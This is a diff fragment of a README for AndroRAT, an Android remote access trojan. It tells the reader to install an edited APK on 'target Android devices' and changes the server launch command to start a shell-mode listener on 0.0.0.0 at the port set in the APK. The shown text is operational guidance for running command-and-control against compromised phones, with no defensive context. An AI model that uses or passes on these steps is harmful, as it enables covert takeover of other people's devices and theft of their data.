@@ -19,4 +19,4 @@ Install the edited AndroRAT APK file on the target Android devices that you want
 Run the Python server script on your server using either a terminal or Termux for Android devices. This script will handle the communication between the target devices and your server.
 
 ```bash
-python androRAT.py
+python androRAT.py --shell -i 0.0.0.0 -p [port base on the edited apk file]
